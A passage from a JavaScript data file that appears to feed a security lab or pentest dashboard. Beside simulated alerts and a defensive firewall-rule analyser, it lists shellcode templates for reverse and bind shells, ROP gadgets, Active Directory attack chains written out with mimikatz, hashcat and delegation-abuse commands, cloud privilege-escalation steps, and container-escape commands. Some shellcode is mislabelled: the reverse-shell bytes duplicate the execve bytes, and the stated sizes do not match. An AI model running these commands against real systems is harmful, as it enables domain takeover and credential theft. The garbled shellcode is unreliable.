  { time: '14:10:22', severity: 'Critical', type: 'C2 Communication', src: '10.0.100.45', detail: 'JA3 fingerprint matches known Cobalt Strike beacon profile', mitre: 'T1071.001' },
  { time: '14:05:11', severity: 'High', type: 'Lateral Movement', src: '10.0.100.78', detail: 'SMB connection to ADMIN$ on 10.0.10.1, 10.0.10.2, 10.0.20.1', mitre: 'T1021.002' },
];

// ============================================================================
// FIREWALL RULE BASE + SEGMENTATION ZONES
// Ordered ACL evaluated top-down, first-match-wins (references NOC topology IPs)
// ============================================================================
const FW_RULEBASE = [
  { seq: 10, name: 'Inbound HTTPS to Web Tier', action: 'allow', src: 'any', dst: '10.0.20.0/24', proto: 'tcp', port: '443', enabled: true, hits: 184203, added: '2025-01-14', by: 'admin' },
  { seq: 20, name: 'Inbound HTTP to Web Tier', action: 'allow', src: 'any', dst: '10.0.20.0/24', proto: 'tcp', port: '80', enabled: true, hits: 96110, added: '2025-01-14', by: 'admin' },
  { seq: 30, name: 'WEB-01 HTTPS Explicit', action: 'allow', src: 'any', dst: '10.0.20.1', proto: 'tcp', port: '443', enabled: true, hits: 0, added: '2025-03-02', by: 'jdoe' },
  { seq: 40, name: 'Block Web Mgmt Port', action: 'deny', src: 'any', dst: '10.0.20.0/24', proto: 'tcp', port: '8080', enabled: true, hits: 412, added: '2025-02-10', by: 'admin' },
  { seq: 50, name: 'Corp VLAN10 to DB MySQL', action: 'allow', src: '10.0.100.0/24', dst: '10.0.30.0/24', proto: 'tcp', port: '3306', enabled: true, hits: 33210, added: '2025-01-20', by: 'admin' },
  { seq: 60, name: 'Corp VLAN20 to DB', action: 'allow', src: '10.0.200.0/24', dst: '10.0.30.1', proto: 'tcp', port: '3306', enabled: true, hits: 1204, added: '2025-04-01', by: 'msmith' },
  { seq: 70, name: 'Mgmt SSH to All Segments', action: 'allow', src: '10.0.0.0/22', dst: 'any', proto: 'tcp', port: '22', enabled: true, hits: 8890, added: '2025-01-15', by: 'admin' },
  { seq: 80, name: 'TEMP Permit Any-Any', action: 'allow', src: 'any', dst: 'any', proto: 'any', port: 'any', enabled: true, hits: 29944, added: '2025-05-30', by: 'oncall' },
  { seq: 90, name: 'Block Dev to Domain Controllers', action: 'deny', src: '10.0.300.0/24', dst: '10.0.10.0/24', proto: 'any', port: 'any', enabled: true, hits: 0, added: '2025-06-02', by: 'admin' },
  { seq: 100, name: 'WiFi to Mail SMTP', action: 'allow', src: '172.16.0.0/16', dst: '10.0.40.1', proto: 'tcp', port: '25', enabled: true, hits: 0, added: '2025-06-02', by: 'admin' },
  { seq: 110, name: 'Legacy Telnet Allow', action: 'allow', src: '10.0.100.0/24', dst: '10.0.10.0/24', proto: 'tcp', port: '23', enabled: false, hits: 0, added: '2024-11-01', by: 'legacy' },
  { seq: 120, name: 'Default Deny', action: 'deny', src: 'any', dst: 'any', proto: 'any', port: 'any', enabled: true, hits: 52310, added: '2025-01-14', by: 'admin' },
];

const FW_ZONES = [
  { id: 'ext', name: 'EXTERNAL', cidr: '0.0.0.0/0', desc: 'Untrusted Internet' },
  { id: 'mgmt', name: 'MGMT', cidr: '10.0.0.0/22', desc: 'Firewalls / routers / switches' },
  { id: 'dc', name: 'DC-AD', cidr: '10.0.10.0/24', desc: 'Domain controllers' },
  { id: 'web', name: 'DMZ-WEB', cidr: '10.0.20.0/24', desc: 'Public web tier' },
  { id: 'db', name: 'DATABASE', cidr: '10.0.30.0/24', desc: 'Database servers' },
  { id: 'mail', name: 'MAIL', cidr: '10.0.40.0/24', desc: 'Mail gateway' },
  { id: 'v10', name: 'CORP-V10', cidr: '10.0.100.0/24', desc: 'Workstations VLAN10' },
  { id: 'v20', name: 'CORP-V20', cidr: '10.0.200.0/24', desc: 'Workstations VLAN20' },
  { id: 'dev', name: 'DEV-V30', cidr: '10.0.300.0/24', desc: 'Developer VLAN' },
  { id: 'wifi', name: 'WIFI', cidr: '172.16.0.0/16', desc: 'Corporate WiFi' },
];

const FW_UDP_PORTS = { 53: 1, 67: 1, 68: 1, 69: 1, 123: 1, 161: 1, 162: 1, 500: 1, 514: 1, 1900: 1, 4500: 1 };

// ---- CIDR / port / proto match helpers (pure, no network) ----
function fwIp2int(ip) { var o = String(ip).split('.'); return (((parseInt(o[0], 10) || 0) * 16777216) + ((parseInt(o[1], 10) || 0) * 65536) + ((parseInt(o[2], 10) || 0) * 256) + (parseInt(o[3], 10) || 0)) >>> 0; }
function fwMaskBits(bits) { bits = Math.max(0, Math.min(32, bits)); return bits === 0 ? 0 : ((0xFFFFFFFF << (32 - bits)) >>> 0); }
function fwParseCidr(s) { s = String(s == null ? '' : s).trim(); if (!s || s === 'any' || s === '*' || s === '0.0.0.0/0') return { any: true, bits: 0, base: 0 }; var pr = s.split('/'); var bits = pr[1] != null ? parseInt(pr[1], 10) : 32; return { any: false, bits: bits, base: (fwIp2int(pr[0]) & fwMaskBits(bits)) >>> 0 }; }
function fwIpInCidr(ip, cidr) { var c = (typeof cidr === 'string') ? fwParseCidr(cidr) : cidr; if (c.any) return true; return ((fwIp2int(String(ip).split('/')[0]) & fwMaskBits(c.bits)) >>> 0) === c.base; }
function fwCidrCovers(outer, inner) { var o = (typeof outer === 'string') ? fwParseCidr(outer) : outer; var i = (typeof inner === 'string') ? fwParseCidr(inner) : inner; if (o.any) return true; if (i.any) return false; return o.bits <= i.bits && (((i.base & fwMaskBits(o.bits)) >>> 0) === o.base); }
function fwCidrOverlap(a, b) { var x = (typeof a === 'string') ? fwParseCidr(a) : a; var y = (typeof b === 'string') ? fwParseCidr(b) : b; if (x.any || y.any) return true; return fwCidrCovers(x, y) || fwCidrCovers(y, x); }
function fwParsePort(s) { s = String(s == null ? 'any' : s).trim().toLowerCase(); if (s === '' || s === 'any' || s === '*') return { any: true, lo: 0, hi: 65535 }; if (s.indexOf('-') > -1) { var pr = s.split('-'); return { any: false, lo: parseInt(pr[0], 10) || 0, hi: parseInt(pr[1], 10) || 65535 }; } var n = parseInt(s, 10) || 0; return { any: false, lo: n, hi: n }; }
function fwPortCovers(outer, inner) { var o = fwParsePort(outer), i = fwParsePort(inner); if (o.any) return true; if (i.any) return false; return o.lo <= i.lo && o.hi >= i.hi; }
function fwPortMatch(rulePort, pkt) { var o = fwParsePort(rulePort); var p = parseInt(pkt, 10); if (o.any) return true; return p >= o.lo && p <= o.hi; }
function fwProtoCovers(outer, inner) { outer = String(outer || 'any').toLowerCase(); inner = String(inner || 'any').toLowerCase(); return outer === 'any' || outer === inner; }
function fwProtoMatch(ruleProto, pkt) { ruleProto = String(ruleProto || 'any').toLowerCase(); pkt = String(pkt || 'any').toLowerCase(); if (ruleProto === 'any' || pkt === 'any') return true; return ruleProto === pkt; }
function fwTransport(port, proto) { proto = String(proto || '').toLowerCase(); if (proto === 'tcp' || proto === 'udp') return proto; return FW_UDP_PORTS[parseInt(port, 10)] ? 'udp' : 'tcp'; }
function fwZoneOf(ip) { for (var i = 0; i < FW_ZONES.length; i++) { var z = FW_ZONES[i]; if (z.id === 'ext') continue; if (fwIpInCidr(ip, z.cidr)) return z; } return FW_ZONES[0]; }
// First-match-wins evaluation over enabled rules
function fwSimulate(pkt) {
  for (var i = 0; i < FW_RULEBASE.length; i++) {
    var r = FW_RULEBASE[i];
    if (!r.enabled) continue;
    if (fwIpInCidr(pkt.src, r.src) && fwIpInCidr(pkt.dst, r.dst) && fwProtoMatch(r.proto, pkt.proto) && fwPortMatch(r.port, pkt.port)) {
      return { action: r.action, rule: r, index: i, matched: true, evaluated: i + 1 };
    }
  }
  return { action: 'deny', rule: null, matched: false, evaluated: FW_RULEBASE.length, reason: 'No matching rule - implicit default deny' };
}
// Static rule-base analysis: shadowed / redundant / overly-permissive / disabled
function fwAnalyze() {
  var out = [];
  for (var i = 0; i < FW_RULEBASE.length; i++) {
    var R = FW_RULEBASE[i]; var issues = [];
    var sAny = fwParseCidr(R.src).any, dAny = fwParseCidr(R.dst).any, pAny = fwParsePort(R.port).any;
    if (R.action === 'allow' && R.enabled) {
      if (sAny && dAny && pAny) issues.push({ sev: 'Critical', type: 'Overly Permissive', msg: 'Allows ANY source to ANY destination on ANY port/proto' });
      else if ((sAny || dAny) && pAny) issues.push({ sev: 'High', type: 'Overly Permissive', msg: 'Allow with any ' + (sAny ? 'source' : 'destination') + ' and any port' });
      else if (sAny || dAny) issues.push({ sev: 'Medium', type: 'Broad Scope', msg: 'Allow with any ' + (sAny ? 'source' : 'destination') });
    }
    if (R.action === 'allow') {
      var pr = PORT_REFERENCE.find(function (p) { return String(p.port) === String(R.port); });
      if (pr && (pr.risk === 'High' || pr.risk === 'Critical')) issues.push({ sev: pr.risk, type: 'Risky Service', msg: 'Permits ' + pr.service + ' (' + pr.risk.toLowerCase() + ' risk): ' + pr.notes });
    }
    if (R.enabled) {
      for (var j = 0; j < i; j++) {
        var E = FW_RULEBASE[j]; if (!E.enabled) continue;
        if (fwCidrCovers(E.src, R.src) && fwCidrCovers(E.dst, R.dst) && fwProtoCovers(E.proto, R.proto) && fwPortCovers(E.port, R.port)) {
          if (E.action === R.action) issues.push({ sev: 'Medium', type: 'Redundant', msg: 'Fully covered by earlier rule #' + E.seq + ' (' + E.name + ') with same action - never fires' });
          else issues.push({ sev: 'High', type: 'Shadowed', msg: 'Unreachable: earlier rule #' + E.seq + ' (' + E.name + ', ' + E.action + ') matches all its traffic first' });
          break;
        }
      }
    }
    if (!R.enabled) issues.push({ sev: 'Info', type: 'Disabled', msg: 'Rule is disabled and not enforced' });
    out.push({ rule: R, issues: issues });
  }
  return out;
}

// ============================================================================
// EXPLOIT DEVELOPMENT LAB DATA
// ============================================================================
const SHELLCODE_TEMPLATES = {
  'x86-reverse-tcp': { arch: 'x86', type: 'Reverse TCP Shell', size: 68, code: '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80', desc: 'Linux x86 reverse TCP shell - connects back to attacker', badchars: '\\x00' },
  'x86-bind-tcp': { arch: 'x86', type: 'Bind TCP Shell', size: 78, code: '\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x5b\\x5e\\x52\\x68\\x02\\x00\\x11\\x5c', desc: 'Linux x86 bind TCP shell - listens on specified port', badchars: '\\x00' },
  'x64-reverse-tcp': { arch: 'x64', type: 'Reverse TCP Shell', size: 74, code: '\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x48\\xb9\\x02\\x00\\x11\\x5c\\x0a\\x00\\x00\\x01', desc: 'Linux x64 reverse TCP shell - connects back to attacker', badchars: '\\x00' },
  'x64-bind-tcp': { arch: 'x64', type: 'Bind TCP Shell', size: 86, code: '\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\\x05\\x48\\x97\\x52\\xc7\\x04\\x24\\x02\\x00\\x11\\x5c', desc: 'Linux x64 bind TCP shell - listens on specified port', badchars: '\\x00' },
  'x86-exec-cmd': { arch: 'x86', type: 'Execute Command', size: 36, code: '\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80', desc: 'Linux x86 execve /bin/sh', badchars: '\\x00' },
  'x64-exec-cmd': { arch: 'x64', type: 'Execute Command', size: 27, code: '\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05', desc: 'Linux x64 execve /bin/sh', badchars: '\\x00' },
  'x86-meterpreter': { arch: 'x86', type: 'Meterpreter Staged', size: 282, code: '\\x6a\\x0a\\x5e\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x93\\x59\\xb0\\x3f\\xcd\\x80', desc: 'Linux x86 staged Meterpreter reverse TCP', badchars: '\\x00\\x0a' },
  'arm-reverse-tcp': { arch: 'ARM', type: 'Reverse TCP Shell', size: 72, code: '\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x02\\x20\\x01\\x21\\x92\\x1a\\x0f\\x02\\x27\\x01\\xdf', desc: 'ARM Linux reverse TCP shell (Thumb mode)', badchars: '\\x00' },
  'win-x86-reverse-tcp': { arch: 'x86', type: 'Windows Reverse TCP', size: 324, code: '\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14', desc: 'Windows x86 reverse TCP shell via WinSock', badchars: '\\x00\\x0a\\x0d' },
  'win-x64-reverse-tcp': { arch: 'x64', type: 'Windows Reverse TCP', size: 460, code: '\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2', desc: 'Windows x64 reverse TCP shell via WinSock', badchars: '\\x00\\x0a\\x0d' },
};

const ROP_GADGETS = [
  { gadget: 'pop rdi; ret', addr: '0x00401234', desc: 'Set first argument (x64 calling convention)', use: 'Function argument setup' },
  { gadget: 'pop rsi; ret', addr: '0x00401238', desc: 'Set second argument', use: 'Function argument setup' },
  { gadget: 'pop rdx; ret', addr: '0x0040123c', desc: 'Set third argument', use: 'Function argument setup' },
  { gadget: 'pop rax; ret', addr: '0x00401240', desc: 'Set syscall number', use: 'Syscall preparation' },
  { gadget: 'syscall; ret', addr: '0x00401244', desc: 'Execute syscall', use: 'Syscall execution' },
  { gadget: 'mov rdi, rsp; ret', addr: '0x00401248', desc: 'Point rdi to stack', use: 'String reference' },
  { gadget: 'xor eax, eax; ret', addr: '0x0040124c', desc: 'Zero out eax', use: 'Register clearing' },
  { gadget: 'pop rbp; ret', addr: '0x00401250', desc: 'Set base pointer', use: 'Stack pivot' },
  { gadget: 'leave; ret', addr: '0x00401254', desc: 'Stack pivot via leave', use: 'Stack pivot' },
  { gadget: 'ret', addr: '0x00401258', desc: 'Return gadget (stack alignment)', use: 'Alignment' },
  { gadget: 'pop rcx; ret', addr: '0x0040125c', desc: 'Set fourth argument (Windows x64)', use: 'Function argument setup' },
  { gadget: 'pop r8; ret', addr: '0x00401260', desc: 'Set fifth argument (Windows x64)', use: 'Function argument setup' },
  { gadget: 'jmp rax', addr: '0x00401264', desc: 'Jump to address in rax', use: 'Code execution' },
  { gadget: 'call rax', addr: '0x00401268', desc: 'Call address in rax', use: 'Code execution' },
  { gadget: 'int 0x80; ret', addr: '0x0040126c', desc: 'x86 syscall interrupt', use: 'x86 syscall' },
  { gadget: 'push rax; ret', addr: '0x00401270', desc: 'Push rax to stack and return', use: 'Stack manipulation' },
];

// ============================================================================
// ACTIVE DIRECTORY ATTACK PLANNER DATA
// ============================================================================
const AD_SIM_USERS = [
  { sam: 'admin', dn: 'CN=Administrator,CN=Users,DC=corp,DC=local', groups: ['Domain Admins','Enterprise Admins','Schema Admins'], spn: false, asrep: false, desc: 'Built-in administrator account' },
  { sam: 'j.smith', dn: 'CN=John Smith,OU=IT,DC=corp,DC=local', groups: ['Domain Admins','IT Staff'], spn: false, asrep: false, desc: 'IT Administrator' },
  { sam: 'svc_sql', dn: 'CN=SQL Service,OU=Service Accounts,DC=corp,DC=local', groups: ['Service Accounts'], spn: true, asrep: false, desc: 'SQL Server service account - SPN: MSSQLSvc/sql01.corp.local:1433' },
  { sam: 'svc_web', dn: 'CN=Web Service,OU=Service Accounts,DC=corp,DC=local', groups: ['Service Accounts'], spn: true, asrep: false, desc: 'IIS service account - SPN: HTTP/web01.corp.local' },
  { sam: 'svc_backup', dn: 'CN=Backup Service,OU=Service Accounts,DC=corp,DC=local', groups: ['Backup Operators','Service Accounts'], spn: true, asrep: false, desc: 'Backup service - SPN: HOST/backup01.corp.local' },
  { sam: 'm.jones', dn: 'CN=Mary Jones,OU=HR,DC=corp,DC=local', groups: ['HR Staff'], spn: false, asrep: true, desc: 'HR Manager - PREAUTH DISABLED' },
  { sam: 'k.wilson', dn: 'CN=Kevin Wilson,OU=Finance,DC=corp,DC=local', groups: ['Finance Staff'], spn: false, asrep: true, desc: 'Finance Analyst - PREAUTH DISABLED' },
  { sam: 'helpdesk', dn: 'CN=Help Desk,OU=IT,DC=corp,DC=local', groups: ['Account Operators','IT Staff'], spn: false, asrep: false, desc: 'Help desk - can reset passwords' },
  { sam: 'svc_exchange', dn: 'CN=Exchange Service,OU=Service Accounts,DC=corp,DC=local', groups: ['Exchange Servers','Organization Management'], spn: true, asrep: false, desc: 'Exchange service - WriteDACL on domain' },
  { sam: 'd.chen', dn: 'CN=David Chen,OU=IT,DC=corp,DC=local', groups: ['Server Operators','IT Staff'], spn: false, asrep: false, desc: 'Server admin - GenericAll on DC' },
  { sam: 'svc_adfs', dn: 'CN=ADFS Service,OU=Service Accounts,DC=corp,DC=local', groups: ['Service Accounts'], spn: true, asrep: false, desc: 'ADFS service - constrained delegation to DC' },
  { sam: 'p.garcia', dn: 'CN=Paula Garcia,OU=Engineering,DC=corp,DC=local', groups: ['Engineering','GPO Admins'], spn: false, asrep: false, desc: 'Engineer - GPO edit rights' },
];

const AD_ATTACK_PATHS = [
  { name: 'Kerberoasting to Domain Admin', severity: 'Critical', steps: ['Enumerate SPNs: Get-ADUser -Filter {ServicePrincipalName -ne "$null"}','Request TGS ticket: Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.corp.local:1433"','Extract ticket from memory: Invoke-Mimikatz -Command \'"kerberos::list /export"\'','Crack offline with hashcat: hashcat -m 13100 ticket.kirbi wordlist.txt','Use svc_sql credentials to access SQL Server','Execute xp_cmdshell for OS command execution','Escalate via linked servers or impersonation','Lateral movement to Domain Controller'], from: 'Any Domain User', to: 'Domain Admin', technique: 'T1558.003', likelihood: 'High' },
  { name: 'AS-REP Roasting', severity: 'High', steps: ['Find accounts without Kerberos pre-auth: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}','Request AS-REP: python GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat','Crack AS-REP hash: hashcat -m 18200 asrep.hash wordlist.txt','Compromise m.jones (HR Manager) or k.wilson (Finance)','Access sensitive HR/Finance data','Potential pivot via HR password reset capabilities'], from: 'Any Domain User', to: 'HR/Finance Access', technique: 'T1558.004', likelihood: 'Medium' },
  { name: 'DCSync via Exchange', severity: 'Critical', steps: ['Compromise svc_exchange account (Kerberoasting)','svc_exchange has WriteDACL on domain object','Grant DCSync rights: Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity svc_exchange -Rights DCSync','Perform DCSync: mimikatz "lsadump::dcsync /domain:corp.local /user:krbtgt"','Extract krbtgt hash for Golden Ticket','Forge Golden Ticket for persistent domain admin access'], from: 'svc_exchange', to: 'Full Domain Compromise', technique: 'T1003.006', likelihood: 'High' },
  { name: 'Constrained Delegation Abuse', severity: 'Critical', steps: ['Identify constrained delegation: Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"}','svc_adfs has constrained delegation to DC','Obtain TGT for svc_adfs via Kerberoasting or credential theft','Request service ticket with S4U2Self + S4U2Proxy','Impersonate Domain Admin to Domain Controller','Access DC with impersonated ticket: Invoke-Mimikatz -Command \'"kerberos::ptt ticket.kirbi"\''], from: 'svc_adfs', to: 'Domain Controller Access', technique: 'T1550.003', likelihood: 'Medium' },
  { name: 'GPO Abuse to Code Execution', severity: 'High', steps: ['p.garcia has GPO edit rights','Create malicious GPO: New-GPO -Name "MaliciousGPO"','Add scheduled task or startup script to GPO','Link GPO to OU containing target machines','Wait for Group Policy refresh (default 90 minutes)','Code execution on all machines in target OU','Harvest credentials from compromised endpoints'], from: 'p.garcia', to: 'Code Execution on Multiple Hosts', technique: 'T1484.001', likelihood: 'Medium' },
  { name: 'Password Reset Chain', severity: 'High', steps: ['Compromise helpdesk account (phishing, credential stuffing)','helpdesk is member of Account Operators','Reset password of j.smith (IT Administrator)','j.smith is a Domain Admin','Access Domain Controller with j.smith credentials','Full domain compromise achieved'], from: 'helpdesk', to: 'Domain Admin', technique: 'T1098', likelihood: 'Medium' },
];

const AD_ATTACKS_DB = [
  { name: 'DCSync', desc: 'Replicate domain credentials by impersonating a Domain Controller using Directory Replication Service (DRS) Remote Protocol. Requires Replicating Directory Changes permission.', tool: 'mimikatz "lsadump::dcsync /domain:DOMAIN /user:krbtgt"', detection: 'EventID 4662 with Properties containing 1131f6aa-9c07-11d1-f79f from non-DC source', mitre: 'T1003.006', prereq: 'WriteDACL on domain or Replicating Directory Changes' },
  { name: 'Golden Ticket', desc: 'Forge a Kerberos TGT using the krbtgt hash. Provides unlimited domain access with configurable lifetime. Survives password resets of all accounts except krbtgt.', tool: 'mimikatz "kerberos::golden /domain:DOMAIN /sid:S-1-5-21-xxx /krbtgt:HASH /user:FakeAdmin /id:500"', detection: 'TGT with anomalous lifetime, encryption type mismatch, event 4769 anomalies', mitre: 'T1558.001', prereq: 'krbtgt NTLM hash (from DCSync or ntds.dit)' },
  { name: 'Silver Ticket', desc: 'Forge a Kerberos TGS for a specific service using the service account NTLM hash. More stealthy than Golden Ticket as it never contacts the DC.', tool: 'mimikatz "kerberos::golden /domain:DOMAIN /sid:S-1-5-21-xxx /target:server.domain /service:cifs /rc4:HASH /user:FakeAdmin"', detection: 'Service ticket without corresponding TGT request, PAC validation failures', mitre: 'T1558.002', prereq: 'Service account NTLM hash' },
  { name: 'Pass-the-Hash', desc: 'Authenticate to remote systems using NTLM hash without knowing the plaintext password. Works against any system accepting NTLM authentication.', tool: 'mimikatz "sekurlsa::pth /user:admin /domain:DOMAIN /ntlm:HASH /run:cmd"', detection: 'LogonType 9 (NewCredentials), NTLM auth from unexpected sources (4624)', mitre: 'T1550.002', prereq: 'NTLM hash of target account' },
  { name: 'Pass-the-Ticket', desc: 'Inject a stolen Kerberos ticket (TGT or TGS) into the current session. Avoids NTLM and can bypass some monitoring.', tool: 'mimikatz "kerberos::ptt ticket.kirbi"', detection: 'Ticket reuse from different IPs, anomalous Kerberos authentication patterns', mitre: 'T1550.003', prereq: 'Exported Kerberos ticket (.kirbi)' },
  { name: 'Skeleton Key', desc: 'Patch the LSASS process on a DC to accept a master password alongside legitimate passwords. Persists until DC reboot.', tool: 'mimikatz "privilege::debug" "misc::skeleton"', detection: 'LSASS memory modification alerts, authentication with Skeleton Key password', mitre: 'T1556.001', prereq: 'Local admin on Domain Controller' },
  { name: 'DCShadow', desc: 'Register a rogue DC to push changes via replication. Can modify any AD object without standard event logging.', tool: 'mimikatz "lsadump::dcshadow /push"', detection: 'New SPN registration for DC, replication from unknown source, nTDSDSA object creation', mitre: 'T1207', prereq: 'Domain Admin or equivalent privileges' },
  { name: 'Shadow Credentials', desc: 'Add an alternative credential (Key Credentials) to a target user/computer. Enables authentication without knowing the password.', tool: 'python pywhisker.py -d corp.local -u attacker -p pass --target victim --action add', detection: 'Modification of msDS-KeyCredentialLink attribute (5136)', mitre: 'T1556.006', prereq: 'Write permission on target msDS-KeyCredentialLink' },
];

// ============================================================================
// CLOUD ATTACK SURFACE DATA
// ============================================================================
const CLOUD_ASSETS = {
  aws: [
    { type: 'EC2', name: 'web-prod-01', region: 'us-east-1', status: 'running', public: true, risk: 'High', issue: 'Security group allows 0.0.0.0/0 on ports 22, 80, 443, 3389' },
    { type: 'EC2', name: 'db-prod-01', region: 'us-east-1', status: 'running', public: false, risk: 'Medium', issue: 'IMDSv1 enabled (SSRF risk)' },
    { type: 'S3', name: 'corp-backups-2024', region: 'us-east-1', status: 'active', public: true, risk: 'Critical', issue: 'Bucket ACL allows public read/write' },
    { type: 'S3', name: 'app-static-assets', region: 'us-east-1', status: 'active', public: true, risk: 'Low', issue: 'Public read only (static content)' },
    { type: 'S3', name: 'customer-data-exports', region: 'us-west-2', status: 'active', public: false, risk: 'Critical', issue: 'No server-side encryption, no versioning' },
    { type: 'Lambda', name: 'data-processor', region: 'us-east-1', status: 'active', public: false, risk: 'High', issue: 'Function has AdministratorAccess IAM role' },
    { type: 'Lambda', name: 'api-handler', region: 'us-east-1', status: 'active', public: true, risk: 'Medium', issue: 'Environment variables contain database credentials' },
    { type: 'RDS', name: 'prod-mysql', region: 'us-east-1', status: 'available', public: true, risk: 'Critical', issue: 'Publicly accessible, no SSL enforcement' },
    { type: 'IAM', name: 'dev-user-01', region: 'global', status: 'active', public: false, risk: 'High', issue: 'Long-lived access keys (320 days old), PowerUserAccess' },
    { type: 'IAM', name: 'ci-cd-role', region: 'global', status: 'active', public: false, risk: 'Critical', issue: 'AdministratorAccess with no condition constraints' },
    { type: 'EKS', name: 'prod-cluster', region: 'us-east-1', status: 'active', public: true, risk: 'High', issue: 'API server publicly accessible, RBAC misconfigured' },
  ],
  azure: [
    { type: 'VM', name: 'dc-azure-01', region: 'eastus', status: 'running', public: true, risk: 'Critical', issue: 'RDP exposed to internet, NSG allows 0.0.0.0/0:3389' },
    { type: 'VM', name: 'web-azure-01', region: 'eastus', status: 'running', public: true, risk: 'Medium', issue: 'No disk encryption, managed identity overprivileged' },
    { type: 'Blob', name: 'logs-container', region: 'eastus', status: 'active', public: true, risk: 'High', issue: 'Container public access level: Blob (anonymous read)' },
    { type: 'Blob', name: 'config-backups', region: 'westus', status: 'active', public: false, risk: 'High', issue: 'SAS token in source code with full permissions, no expiry' },
    { type: 'SQL', name: 'prod-sqldb', region: 'eastus', status: 'online', public: true, risk: 'Critical', issue: 'Allow Azure services and resources to access server enabled' },
    { type: 'App Service', name: 'api-webapp', region: 'eastus', status: 'running', public: true, risk: 'Medium', issue: 'FTP deployment enabled, HTTP not redirected to HTTPS' },
    { type: 'Key Vault', name: 'prod-secrets', region: 'eastus', status: 'active', public: false, risk: 'High', issue: 'Overly permissive access policies, no private endpoint' },
    { type: 'AKS', name: 'prod-k8s', region: 'eastus', status: 'running', public: true, risk: 'High', issue: 'Dashboard exposed, default namespace has cluster-admin binding' },
  ],
  gcp: [
    { type: 'GCE', name: 'web-prod', region: 'us-central1', status: 'running', public: true, risk: 'Medium', issue: 'Default service account with project editor role' },
    { type: 'GCS', name: 'user-uploads', region: 'us-central1', status: 'active', public: true, risk: 'Critical', issue: 'Bucket is publicly accessible via allUsers permission' },
    { type: 'GCS', name: 'terraform-state', region: 'us-central1', status: 'active', public: false, risk: 'Critical', issue: 'Contains infrastructure secrets, no object versioning' },
    { type: 'Cloud SQL', name: 'prod-postgres', region: 'us-central1', status: 'running', public: true, risk: 'High', issue: 'Authorized networks includes 0.0.0.0/0' },
    { type: 'GKE', name: 'app-cluster', region: 'us-central1', status: 'running', public: true, risk: 'High', issue: 'Legacy ABAC enabled, metadata concealment not configured' },
    { type: 'Cloud Function', name: 'data-pipeline', region: 'us-central1', status: 'active', public: true, risk: 'High', issue: 'Invokable by allUsers, has BigQuery admin role' },
    { type: 'IAM', name: 'service-account-1', region: 'global', status: 'active', public: false, risk: 'Critical', issue: 'Owner role on project, key exported 180 days ago' },
  ],
};

const CLOUD_PRIVESC_PATHS = [
  { cloud: 'AWS', name: 'Lambda Function to Admin', risk: 'Critical', steps: ['Compromise Lambda with AdministratorAccess role','Use boto3 to create new IAM user with admin privileges','Generate access keys for the new user','Pivot to full account control'] },
  { cloud: 'AWS', name: 'EC2 SSRF to Credentials', risk: 'High', steps: ['Exploit SSRF vulnerability on EC2 instance with IMDSv1','Query http://169.254.169.254/latest/meta-data/iam/security-credentials/','Obtain temporary IAM credentials','Enumerate and pivot using stolen credentials'] },
  { cloud: 'AWS', name: 'S3 Bucket Policy Manipulation', risk: 'High', steps: ['Find user with s3:PutBucketPolicy permission','Modify bucket policy to grant public access','Exfiltrate data or use as staging area','Potentially modify Lambda deployment packages in S3'] },
  { cloud: 'Azure', name: 'Managed Identity Escalation', risk: 'Critical', steps: ['Compromise VM with overprivileged Managed Identity','Query Azure IMDS for access token','Use token to enumerate Azure resources','Escalate via role assignments or Key Vault access'] },
  { cloud: 'Azure', name: 'Automation Account RunAs', risk: 'Critical', steps: ['Find Automation Account with RunAs connection','Extract certificate from Automation Account','Authenticate as service principal','Service principal often has Contributor on subscription'] },
  { cloud: 'GCP', name: 'Service Account Key Theft', risk: 'Critical', steps: ['Locate exported service account key files','Keys do not expire and grant persistent access','Use key to authenticate via gcloud or API','Enumerate permissions and escalate'] },
  { cloud: 'GCP', name: 'Compute Engine to Project Admin', risk: 'High', steps: ['Access GCE instance with default service account','Default SA has project Editor role','Query metadata server for access token','Use token to modify IAM policies, create new SAs'] },
];

const CONTAINER_ESCAPES = [
  { name: 'Privileged Container Escape', risk: 'Critical', desc: 'Container running with --privileged flag has full host kernel access', exploit: 'Mount host filesystem: nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash', detection: 'Monitor for privileged container creation, host mount points' },
  { name: 'Docker Socket Mount', risk: 'Critical', desc: 'Container has /var/run/docker.sock mounted, allowing host Docker control', exploit: 'docker -H unix:///var/run/docker.sock run -v /:/host --privileged alpine chroot /host', detection: 'Audit Docker socket mount in container specs' },
  { name: 'CVE-2019-5736 (runc)', risk: 'Critical', desc: 'Overwrite host runc binary to gain root on next container start', exploit: 'Replace /proc/self/exe with malicious binary, wait for runc invocation', detection: 'Upgrade runc, monitor /usr/bin/runc modifications' },
